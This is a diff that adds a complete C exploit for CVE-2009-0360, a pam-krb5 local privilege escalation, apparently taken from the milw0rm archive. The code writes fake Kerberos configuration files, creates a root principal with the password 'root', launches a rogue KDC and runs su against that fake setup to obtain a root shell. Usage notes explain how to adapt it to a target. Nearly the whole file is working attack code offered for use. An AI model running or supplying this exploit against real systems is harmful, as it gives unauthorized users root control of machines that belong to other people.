@@ -1,0 +1,163 @@
+/*
+ * cve-2009-0360.c
+ *
+ * pam-krb5 < 3.13 local privilege escalation
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ *
+ * Information:
+ *
+ *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0360
+ *
+ *   pam-krb5 before 3.13, when linked against MIT Kerberos, does not properly 
+ *   initialize the Kerberos libraries for setuid use, which allows local 
+ *   users to gain privileges by pointing an environment variable to a 
+ *   modified Kerberos configuration file, and then launching a PAM-based 
+ *   setuid application. 
+ *   
+ * Usage:
+ *
+ *   $ gcc cve-2009-0360.c -o cve-2009-0360
+ *   $ ./cve-2009-0360
+ *   [+] creating krb5.conf
+ *   [+] creating kdc.conf
+ *   [+] creating kerberos database
+ *   Loading random data
+ *   Initializing database '/tmp/cve-2009-0360/principal' for realm 'TEST.COM',
+ *   master key name 'K/M@TEST.COM'
+ *   [+] adding principal root@TEST.COM
+ *   Authenticating as principal root@TEST.COM with password.
+ *   Enter KDC database master key: 
+ *   WARNING: no policy specified for root@TEST.COM; defaulting to no policy
+ *   Principal "root@TEST.COM" created.
+ *   [+] launching krb5kdc on 141.212.110.163:6666
+ *   [+] launching su with fake KDC configuration
+ *   [+] enter "root" at the password prompt
+ *   Password: 
+ *   # id
+ *   uid=0(root) gid=0(root) ...
+ *
+ * Notes:
+ *
+ *   This exploit will result in local privilege escalation on hosts that use 
+ *   the pam-krb5 module for su authentication.  Check the su and system-auth
+ *   PAM configuration files in /etc/pam.d to determine if pam-krb5 is in use.
+ *   Some customization of the defined constants and paths may be necessary 
+ *   for your environment.  Be sure to set FAKE_KDC_HOST to the IP address of
+ *   an active non-loopback interface on the target machine.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+
+#define REALM "TEST.COM"
+#define FAKE_KDC_HOST "141.212.110.163"
+#define FAKE_KDC_PORT "6666"
+#define PRINCIPAL_NAME "root"
+#define PRINCIPAL_PASS "root"
+#define TMP_DIR "/tmp/cve-2009-0360"
+#define KUTIL_PATH "/usr/sbin/kdb5_util"
+#define KADMIN_PATH "/usr/sbin/kadmin.local"
+#define KRB5KDC_PATH "/usr/sbin/krb5kdc"
+
+#define KRB5_CONF \
+  "[libdefaults]\n\tdefault_realm = " REALM "\n\n[realms]\n\t" REALM \
+  " = {\n\t\tadmin_server = " FAKE_KDC_HOST ":" FAKE_KDC_PORT "\n\t\t" \
+  "default_domain = " REALM "\n\t\tkdc = " FAKE_KDC_HOST ":" FAKE_KDC_PORT \
+  "\n\t}\n\n[domain_realm]\n\t." REALM " = " REALM "\n\t" REALM " = " REALM
+
+#define KDC_CONF \
+  "[kdcdefaults]\n\tkdc_ports = " FAKE_KDC_PORT "\n\n[realms]\n\t" REALM \
+  " = {\n\t\tdatabase_name = " TMP_DIR "/principal\n\t\tadmin_keytab = " \
+  "FILE:" TMP_DIR "/kadm5.keytab\n\t\tacl_file = " TMP_DIR "/kadm5.acl" \
+  "\n\t\tkey_stash_file = " TMP_DIR "/stash\n\t\tkdc_ports = " FAKE_KDC_PORT \
+  "\n\t\tmax_life = 10h 0m 0s\n\t\tmax_renewable_life = 7d 0h 0m 0s\n\t}"
+
+int
+main(void)
+{
+    int ret;
+    FILE *fp;
+    char *err;
+
+    ret = mkdir(TMP_DIR, 0755);
+    if (ret == -1 && errno != EEXIST) {
+        err = "cannot create TMP_DIR";
+        printf("[-] Error: %s (%s)\n", err, strerror(errno));
+        return 1;
+    }
+
+    printf("[+] creating krb5.conf\n");
+    sleep(1);
+
+    fp = fopen(TMP_DIR "/krb5.conf", "w");
+    if (!fp) {
+        err = "cannot open krb5.conf";
+        printf("[-] Error: %s (%s)\n", err, strerror(errno));
+        return 1;
+    }
+    fwrite(KRB5_CONF, 1, strlen(KRB5_CONF), fp);
+    fclose(fp);
+
+    printf("[+] creating kdc.conf\n");
+    sleep(1);
+
+    fp = fopen(TMP_DIR "/kdc.conf", "w");
+    if (!fp) {
+        err = "cannot open kdc.conf";
+        printf("[-] Error: %s (%s)\n", err, strerror(errno));
+        return 1;
+    }
+    fwrite(KDC_CONF, 1, strlen(KDC_CONF), fp);
+    fclose(fp);
+
+    chdir(TMP_DIR);
+
+    printf("[+] creating kerberos database\n");
+    sleep(1);
+
+    ret = system(KUTIL_PATH " create -d " TMP_DIR "/principal -sf " TMP_DIR \
+                 "/stash -r " REALM " -s -P \"\"");
+    if (WEXITSTATUS(ret) != 0) {
+        err = "kdb5_util command returned non-zero";
+        printf("[-] Error: %s, continuing exploit anyway\n", err);
+    }
+
+    printf("[+] adding principal " PRINCIPAL_NAME "@" REALM "\n");
+    sleep(1);
+
+    ret = system("echo \"\" | " KADMIN_PATH " -m -p " PRINCIPAL_NAME "@" REALM \
+                 " -d " TMP_DIR "/principal -r " REALM " -q \"add_principal " \
+                 "-pw " PRINCIPAL_PASS " " PRINCIPAL_NAME "@" REALM "\"");
+    if (WEXITSTATUS(ret) != 0) {
+        err = "kadmin.local command returned non-zero";
+        printf("[-] Error: %s, continuing exploit anyway\n", err);
+    }
+
+    printf("[+] launching krb5kdc on " FAKE_KDC_HOST ":" FAKE_KDC_PORT "\n");
+    sleep(1);
+
+    ret = system("KRB5_KDC_PROFILE=\"" TMP_DIR "/kdc.conf\" " KRB5KDC_PATH \
+                 " -d " TMP_DIR "/principal -r " REALM);
+    if (WEXITSTATUS(ret) != 0) {
+        err = "krb5kdc command returned non-zero";
+        printf("[-] Error: %s, continuing exploit anyway\n", err);
+    }
+
+    printf("[+] launching su with fake KDC configuration\n");
+    sleep(1);
+    printf("[+] enter \"" PRINCIPAL_PASS "\" at the password prompt\n");
+    sleep(1);
+
+    system("KRB5_CONFIG=\"" TMP_DIR "/krb5.conf\" su");
+
+    return 0;
+}
+
+// milw0rm.com [2009-03-29]
